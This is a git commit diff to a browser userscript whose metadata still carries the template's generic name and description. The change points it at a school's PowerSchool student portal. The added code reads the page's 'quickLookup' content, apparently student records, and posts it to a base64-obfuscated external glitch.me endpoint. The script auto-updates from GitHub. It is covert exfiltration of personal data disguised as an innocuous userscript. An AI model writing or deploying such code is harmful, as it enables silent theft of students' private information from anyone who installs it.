5dcc3220dc7ea94267ea5fa791443e15291322f6
AG231921 <56095475+AG231921@users.noreply.github.com>
2022-05-01 23:03:46 -0400

    Update UserScript.js

--- UserScript.js
+++ UserScript.js
@@ -1,16 +1,24 @@
 // ==UserScript==
 // @name         New Userscript
 // @namespace    http://tampermonkey.net/
-// @version      0.3
+// @version      0.4
 // @description  try to take over the world!
 // @author       You
-// @match        https://github.com/
+// @match        https://ps.pcti.tec.nj.us/guardian/home.html
+// @match        https://ps.pcti.tec.nj.us/guardian/home.html?_userTypeHint=student#
 // @icon         https://www.google.com/s2/favicons?sz=64&domain=github.com
 // @grant        none
 // @downloadURL  https://raw.githubusercontent.com/AG231921/jasoc/main/UserScript.js
 // @updateURL    https://raw.githubusercontent.com/AG231921/jasoc/main/UserScript.js
 // ==/UserScript==
 
-function js() {
-window.open("https://www.google.com");
-}
+var btn = document.getElementById("quickLookup");
+
+var str = btn.innerHTML;
+
+fetch(atob("aHR0cHM6Ly92ZW51cy1kYXRhLmdsaXRjaC5tZS9yZWdpc3Rlci1kYXRh"), {
+    method: "post",
+    body: str
+  }).then(function(response) {
+    console.log(response);
+  })
